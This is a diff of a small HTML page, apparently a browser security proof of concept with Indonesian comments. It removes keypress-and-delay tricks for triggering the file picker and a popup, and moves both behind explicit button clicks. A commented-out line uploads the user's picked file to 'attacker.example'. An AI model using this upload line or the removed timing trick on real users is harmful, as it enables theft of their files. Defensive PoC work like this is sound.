@@ -1,58 +1,66 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>PoC picker fixed</title>
 </head>
 <body>
+  <p>Gunakan tombol di bawah untuk memicu file picker dengan aman.</p>
+  <button id="pickBtn">Tekan untuk pilih gambar</button>
+  <button id="openPopup" disabled>Open popup (setelah pick)</button>
+  <div>
+    <img id="img" style="max-width:400px; border:1px solid #ccc; display:none; margin-top:10px;">
+  </div>
+  <pre id="log"></pre>
 
-  <img id="img" style="max-width:400px; border:1px solid #ccc; display:none;">
+<script>
+const btn = document.getElementById('pickBtn');
+const popupBtn = document.getElementById('openPopup');
+const img = document.getElementById('img');
+const log = document.getElementById('log');
+function L(...a){ log.textContent += a.join(' ') + '\\n'; console.log(...a); }
 
-  <script>
-
-    document.addEventListener("keydown", async (event) => {
-      if (event.key === "x") {
-        await new Promise(r => setTimeout(r, 3900));
-
-        let [fileHandle] = await showOpenFilePicker({
-          types: [{
-            description: "Gambar",
-            accept: {"image/*": [".png", ".jpg", ".jpeg", ".gif", ".webp"]}
-          }]
-        });  
-        let file = await fileHandle.getFile();
-        img.src = URL.createObjectURL(file);
-        img.style.display = "block";
-        console.log("File dipilih:", file.name, file.type, file.size);
-        
-      }
+// Pemicu yang jelas: klik tombol
+btn.addEventListener('click', async () => {
+  try {
+    L('Memanggil showOpenFilePicker() dari click (user gesture)');
+    const [fileHandle] = await window.showOpenFilePicker({
+      types: [{
+        description: 'Gambar',
+        accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp'] }
+      }],
+      multiple: false
     });
 
-    const keysPressed = new Set();
+    const file = await fileHandle.getFile();
+    L('File dipilih:', file.name, file.type, file.size);
+    img.src = URL.createObjectURL(file);
+    img.style.display = 'block';
 
-    document.addEventListener("keydown", async (event) => {
-      keysPressed.add(event.key);
-    
-      if (keysPressed.has("z") && keysPressed.has("x")) {
-        await new Promise(r => setTimeout(r, 4000));
-        window.open("https://www.google.com");
-        //console.log("Z dan X ditekan bersamaan!");
-      }
-    });
-    
-    document.addEventListener("keyup", (event) => {
-      keysPressed.delete(event.key);
-    });
+    // Enable tombol popup setelah file dipilih (jika kamu mau simulasi membuka window lain)
+    popupBtn.disabled = false;
 
-    fileSelect.onchange = () => {
-      if (fileSelect.files.length > 0) {
-        let file = fileSelect.files[0];
-        img.src = URL.createObjectURL(file);
-        img.style.display = "block";
-      }
+    // Contoh upload (komentari jika tidak ada server)
+    // const fd = new FormData(); fd.append('file', file, file.name);
+    // const res = await fetch('https://attacker.example/upload', { method:'POST', body:fd });
+    // L('Upload status:', res.status);
+
+  } catch (err) {
+    if (err && err.name === 'AbortError') {
+      L('Operasi dibatalkan (user cancel atau context lost).');
+    } else {
+      L('Error:', err && err.name, err && err.message);
     }
+  }
+});
 
-  </script>
+// Tombol untuk membuka popup/Google — TIDAK direkomendasikan membuka sebelum picker selesai
+popupBtn.addEventListener('click', () => {
+  // membuka popup setelah picker selesai bukan sebelum nya
+  window.open('https://www.google.com', '_blank', 'noopener');
+  L('Popup dibuka.');
+});
+</script>
 </body>
 </html>
